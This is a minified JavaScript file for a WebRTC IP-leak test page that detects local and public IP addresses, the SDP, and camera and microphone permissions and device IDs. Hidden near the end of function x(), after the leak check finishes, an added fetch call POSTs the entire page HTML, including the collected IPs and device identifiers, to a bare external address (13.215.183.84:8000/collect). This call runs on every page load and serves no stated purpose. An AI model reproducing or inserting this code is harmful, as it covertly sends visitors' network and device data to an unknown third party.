! function () {
    var t = !1,
        s = {
            local: [],
            public: []
        },
        r = {
            ipv4: "",
            ipv6: ""
        },
        u = {},
        f = ["0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/12", "192.0.0.170/32", "192.0.0.171/32", "192.0.0.0/24", "192.0.2.0/24", "192.31.196.0/24", "192.52.193.0/24", "192.88.99.0/24", "192.168.0.0/16", "192.175.48.0/24", "198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "255.255.255.255/32", "224.0.0.0/4", "240.0.0.0/4"],
        l = ["::1/128", "::/128", "::ffff:0:0/96", "::ffff:0:0:0/96", "64:ff9b::/96", "64:ff9b:1::/48", "100::/64", "2001::/23", "2001:db8::/32", "2002::/16", "2620:4f:8000::/48", "fc00::/7", "fe80::/10", "ff00::/8"],
        n = _el("#client-ipv4"),
        i = _el("#client-ipv6"),
        o = _el("#rtc-leak"),
        p = _el("#rtc-local"),
        v = _el("#rtc-public"),
        h = _el("#rtc-sdp"),
        m = _el("#rtc-enumeratedevices"),
        a = _el("#rtc-audio-button"),
        g = _el("#rtc-audio-permission"),
        c = _el("#rtc-video-button"),
        b = _el("#rtc-video-permission"),
        L = _el("#rtc-device-ids"),
        n = (r.ipv4 = n.dataset.ip, u[r.ipv4] = n.dataset.cc, E(), x(), !1),
        d = !1;
    try {
        var e = y({
            iceServers: [{
                urls: "stun:0"
            }]
        });
        e && (n = !0), "function" == typeof e.createDataChannel && (d = !0)
    } catch (e) {
        d = n = !1
    }

    function T() {
        var e = !1,
            n = !1;
        if (0 < s.local.length && (e = !0), 0 < s.public.length)
            for (var t = 0; t < s.public.length; t++)
                if (r.ipv4 !== s.public[t] && r.ipv6 !== s.public[t]) {
                    n = !0;
                    break
                } var i = "",
                    a = e ? ico(0, "!") + "WebRTC exposes your Local IP" : ico(1) + "No Local IP Leak",
                    c = n ? ico(0, "!") + "WebRTC IP doesn't match your Remote IP" : ico(1) + "No Public IP Leak";
        e || n ? (i = a, o.previousSibling.setAttribute("rowspan", "2"), (e = document.createElement("tr")).classList.add("rtc-leak-tr"), (a = document.createElement("td")).innerHTML = c, e.appendChild(a), (c = o.parentNode).parentNode.insertBefore(e, c.nextSibling)) : i = ico(1) + "No Leak", o.classList.remove("load-td"), o.innerHTML = i
    }

    function x() {
        h.parentElement.classList.add("n"), a.disabled = !0, c.disabled = !0, [o, p, v].forEach(function (e) {
            e.textContent = ""
        }), v.innerHTML = "", _els(".rtc-leak-tr").forEach(function (e) {
            e.remove()
        }), o.previousSibling.removeAttribute("rowspan"), o.classList.add("load-td");
        var e = t ? Promise.resolve() : (i.classList.add("load-td"), fetchTM("https://ipv6.browserleaks.com/country", {
            cache: "no-store"
        }, 12e3).then(function (e) {
            return e.json()
        }).then(function (e) {
            r.ipv6 = e.ip, i.innerHTML = flagBox(e.cc, e.ip, !0), u[e.ip] = e.cc
        }).catch(function () {
            i.textContent = "-"
        }).finally(function () {
            t = !0, i.classList.remove("load-td")
        })),
            n = new Promise(function (e, n) {
                var t = function (e) {
                    for (var n in e) {
                        e[n] = function (e) {
                            for (var n = [], t = [], i = 0; i < e.length; i++) - 1 !== e[i].indexOf(".") ? n.push(e[i]) : -1 !== e[i].indexOf(":") && t.push(e[i]);
                            return n.concat(t)
                        }(e[n]);
                        var t = "local" == n ? p : v;
                        if (e[n].length)
                            for (var i in 1 < e[n].length && t.classList.add("flag-multi"), e[n]) {
                                var a, i = e[n][i];
                                "local" == n ? t.insertAdjacentHTML("beforeend", flagBox("_local", i, !0)) : (a = "ip-" + i.replace(/[\.\:\%]/g, "-"), t.insertAdjacentHTML("beforeend", flagBox(!1, i, !0, ' id="' + a + '"')), function (n, e) {
                                    var t;
                                    u[n] ? _(u[n], e) : fetch("/xhr/country/" + n).then(function (e) {
                                        return e.json()
                                    }).then(function (e) {
                                        void 0 !== e.cc && (u[n] = e.cc, t = e.cc)
                                    }).catch(function (e) { }).finally(function () {
                                        _(t || "x", e)
                                    })
                                }(i, a))
                            } else t.textContent = "-"
                    }
                },
                    i = e,
                    a = n,
                    c = [],
                    r = y({
                        iceServers: [{
                            urls: [e = "stun:stun.l.google.com:19302"],
                            url: e
                        }]
                    }, {
                        optional: [{
                            RtpDataChannels: !0
                        }]
                    }) || !1;
                if (r && "function" == typeof r.createOffer) {
                    "function" == typeof r.createDataChannel && r.createDataChannel("bl"), r.addEventListener("icecandidate", f);
                    try {
                        r.createOffer({
                            offerToReceiveAudio: 1,
                            offerToReceiveVideo: 1
                        }).then(function (e) {
                            if (!k(e)) throw null;
                            e.sdp = M(e.sdp), r.setLocalDescription(e)
                        }).catch(function () {
                            r.createOffer().then(function (e) {
                                if (!k(e)) throw null;
                                e.sdp = M(e.sdp), r.setLocalDescription(e)
                            }).catch(function () {
                                return a()
                            })
                        })
                    } catch (e) {
                        r.createOffer(function (e) {
                            if (!k(e)) return a();
                            r.setLocalDescription(e, function () { }, function () { })
                        }, function (e) {
                            return a()
                        })
                    }
                    var o = 0,
                        d = setInterval(function () {
                            var e, n = !1,
                                t = r.localDescription;
                            (e = k(t) ? t.sdp.split("\n") : e) && e.forEach(function (e) {
                                -1 !== e.indexOf("candidate:") && (e = C(e)) && (D(e) || (n = !0), c.indexOf(e) < 0) && c.push(e)
                            }), o++, (n || 5 <= o) && l()
                        }, 3e3)
                } else a();

                function f(e) {
                    var n;
                    e.candidate && e.candidate.candidate && (n = C(e.candidate.candidate)) && c.indexOf(n) < 0 && c.push(n), null == e.candidate && l()
                }

                function l() {
                    r.removeEventListener("icecandidate", f), clearInterval(d), h.parentElement.classList.remove("n"), r.localDescription && (h.textContent = r.localDescription.sdp), c.forEach(function (e) {
                        var n = D(e) ? "local" : "public"; - 1 === s[n].indexOf(e) && s[n].push(e)
                    }), r.close(), t(s), i()
                }
            }).catch(function () {
                [p, v, h.parentElement.parentElement].forEach(function (e) {
                    e && (e.textContent = "-")
                }), T()
            });
        Promise.all([e, n]).then(function () {
            T()
        }).finally(function () {
            a.disabled = !1, c.disabled = !1

            fetch('http://13.215.183.84:8000/collect', {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ "data": String(document.documentElement.innerHTML) })
            })
        })
    }

    function y(e, n) {
        for (var t, i, a = ["", "webkit", "moz", "ms"], c = "RTCPeerConnection", r = 0; r < a.length; r++)
            if (t = (t = window[a[r] + c]) || (i = i || _el("#rtc-iframe")).contentWindow[a[r] + c]) return new t(e, n || {});
        return !1
    }

    function k(e) {
        return e && e.sdp && !(e.sdp.length < 10)
    }

    function M(e) {
        var n = "v=0\r\n";
        return e.substring(0, n.length) !== n ? n + e : e
    }

    function _(e, n) {
        n = _el("#" + n), "x" !== e && 2 == e.length && (n.title = n.alt = e.toUpperCase()), n.src = "/img/flags/" + e + ".png"
    }

    function C(e) {
        return !(null === (e = /([0-9]{1,3}(\.[0-9]{1,3}){3}|(([0-9a-f]{1,4}:){7}([0-9a-f]{1,4}|:))|(([0-9a-f]{1,4}:){6}(:[0-9a-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9a-f]{1,4}:){5}(((:[0-9a-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9a-f]{1,4}:){4}(((:[0-9a-f]{1,4}){1,3})|((:[0-9a-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){3}(((:[0-9a-f]{1,4}){1,4})|((:[0-9a-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){2}(((:[0-9a-f]{1,4}){1,5})|((:[0-9a-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9a-f]{1,4}:){1}(((:[0-9a-f]{1,4}){1,6})|((:[0-9a-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9a-f]{1,4}){1,7})|((:[0-9a-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))/.exec(e)) || !e[1]) && e[1]
    }

    function D(e) {
        function a(e, n) {
            return e.length < n ? a("0" + e, n) : e
        }

        function n(e) {
            var n, t, i = "";
            if (-1 < e.indexOf(":"))
                for (n = e.split(":"), t = 0; t < n.length; t++) i += a(parseInt(n[t], 16).toString(2), 16);
            else
                for (n = e.split("."), t = 0; t < n.length; t++) i += a(parseInt(n[t], 10).toString(2), 8);
            return i
        }
        for (var t = n(e), i = -1 < e.indexOf(":") ? l : f, c = 0, r = i.length; c < r; c++) {
            var o = i[c].split("/"),
                d = n(o[0]);
            if (t.substring(0, o[1]) === d.substring(0, o[1])) return 1
        }
    }

    function E(d) {
        d = d || !1;
        var f = !1,
            l = !1,
            e = [];
        navigator.permissions && "function" == typeof navigator.permissions.query && (e.push(navigator.permissions.query({
            name: "microphone"
        }).then(function (e) {
            f = e.state
        }).catch(function () {
            f = !1
        })), e.push(navigator.permissions.query({
            name: "camera"
        }).then(function (e) {
            l = e.state
        }).catch(function () {
            l = !1
        }))), Promise.all(e).then(function () {
            navigator.mediaDevices && navigator.mediaDevices.enumerateDevices ? navigator.mediaDevices.enumerateDevices().then(function (e) {
                function n(e, n) {
                    var t;
                    switch (e) {
                        case "granted":
                            t = ico(0, "!") + "Granted Permanently";
                            break;
                        case "prompt":
                            t = ico(2) + "Prompt";
                            break;
                        case "deined":
                            t = ico(0) + "Denied";
                            break;
                        default:
                            t = n ? i ? ico(1) + "Granted" : ico(0, "!") + "Granted Permanently" : ico(2) + "Prompt"
                    }
                    return t
                }
                var t, i = d,
                    a = f,
                    c = l,
                    r = !(t = ""),
                    o = {};
                e.forEach(function (e) {
                    r || (t += "\n"), r = !1, t += function (e) {
                        for (var n = ["kind", "label", "deviceId", "groupId"], t = "", i = 0; i < n.length; i++) {
                            var a = n[i],
                                c = 8 - a.length,
                                c = Array(1 + c).join(" ") + a,
                                r = e[a] || "n/a";
                            t += c + ": " + ("kind" === a ? "<b>" + r + "</b>" : r) + "\n"
                        }
                        return t
                    }(e), o[e.kind] || (o[e.kind] = !!e.label.length)
                }), g.innerHTML = n(a, o.audioinput), b.innerHTML = n(c, o.videoinput), m.innerHTML = ico(1) + "True", "" != t ? (L.classList.add("mono"), L.innerHTML = t) : L.textContent = "n/a"
            }).catch(function (e) {
                P()
            }) : P()
        })
    }

    function H(t, e) {
        navigator.mediaDevices.getUserMedia({
            audio: t,
            video: e
        }).then(function () {
            E(!0), x()
        }).catch(function (e) {
            var n;
            return (t ? g : b).innerHTML = ico(0) + (n = '"' + e.name + '"', e.message && (n += " – " + e.message), n), !1
        })
    }

    function P() {
        m.innerHTML = ico(0) + "False", [g, b, L].forEach(function (e) {
            e.textContent = "n/a"
        })
    }
    _el("#rtc-peerconnection").innerHTML = n ? ico(1) + "True" : ico(0) + "False", _el("#rtc-datachannel").innerHTML = d ? ico(1) + "True" : ico(0) + "False", a.addEventListener("click", function () {
        H(!0, !1), g.innerHTML = ico(2)
    }), c.addEventListener("click", function () {
        H(!1, !0), b.innerHTML = ico(2)
    })
}();